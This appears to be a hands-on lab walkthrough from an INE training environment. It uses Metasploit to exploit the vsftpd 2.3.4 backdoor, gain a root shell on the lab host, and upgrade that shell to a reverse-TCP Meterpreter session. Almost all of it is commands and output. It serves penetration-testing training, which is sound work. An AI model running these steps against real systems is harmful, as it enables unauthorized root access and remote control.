# Exploiting A Vulnerable FTP Server

```bash
# Start Metasploit
msf6 > db_nmap -sS -sV -O 192.124.231.3
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-24 07:58 IST
[*] Nmap: Nmap scan report for demo.ine.local (192.124.231.3)
[*] Nmap: Host is up (0.000079s latency).
[*] Nmap: Not shown: 999 closed tcp ports (reset)
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 21/tcp open  ftp     vsftpd 2.3.4      <- FTP
[*] Nmap: MAC Address: 02:42:C0:7C:E7:03 (Unknown)
[*] Nmap: No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

# Search module with FTP version
msf6 > search vsftpd
# Choose module for the target version (2.3.4)
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) >

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.124.231.3
RHOSTS => 192.124.231.3

# Run module
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 192.124.231.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.124.231.3:21 - USER: 331 Please specify the password.
[+] 192.124.231.3:21 - Backdoor service has been spawned, handling...
[+] 192.124.231.3:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.124.231.2:44307 -> 192.124.231.3:6200) at 2025-07-24 08:02:46 +0530

# Start bash session
/bin/bash -i
bash: cannot set terminal process group (17): Inappropriate ioctl for device
bash: no job control in this shell
root@demo:~/vsftpd-2.3.4# 
```

### Shell to Meterpreter
```bash
# Put session background
root@demo:~# ^Z
Background session 1? [y/N]  y
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 

# Use module to make shell session to meterpreter session
# "shell_to_meterpreter"
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > search shell_to_meterpreter
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) >
msf6 post(multi/manage/shell_to_meterpreter) > set LHOST 192.124.231.2
LHOST => 192.124.231.2
msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1
SESSION => 1

# How to check session ID
msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               192.124.231.2:44307 -> 192.124.
                                         231.3:6200 (192.124.231.3)

msf6 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.124.231.2:4433 
[*] Sending stage (1017704 bytes) to 192.124.231.3
[*] Meterpreter session 2 opened (192.124.231.2:4433 -> 192.124.231.3:41396) at 2025-07-24 08:07:52 +0530
[*] Command stager progress: 100.00% (773/773 bytes)
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > 

# Check session
# Notice there is new session with meterpreter
msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type                Information          Connection
  --  ----  ----                -----------          ----------
  1         shell cmd/unix                           192.124.231.2:44307
                                                      -> 192.124.231.3:6
                                                     200 (192.124.231.3)
  2         meterpreter x86/li  root @ demo.ine.loc  192.124.231.2:4433
            nux                 al                   -> 192.124.231.3:41
                                                     396 (192.124.231.3)


# Start session 2
msf6 post(multi/manage/shell_to_meterpreter) > sessions 2
[*] Starting interaction with 2...

meterpreter > 
```
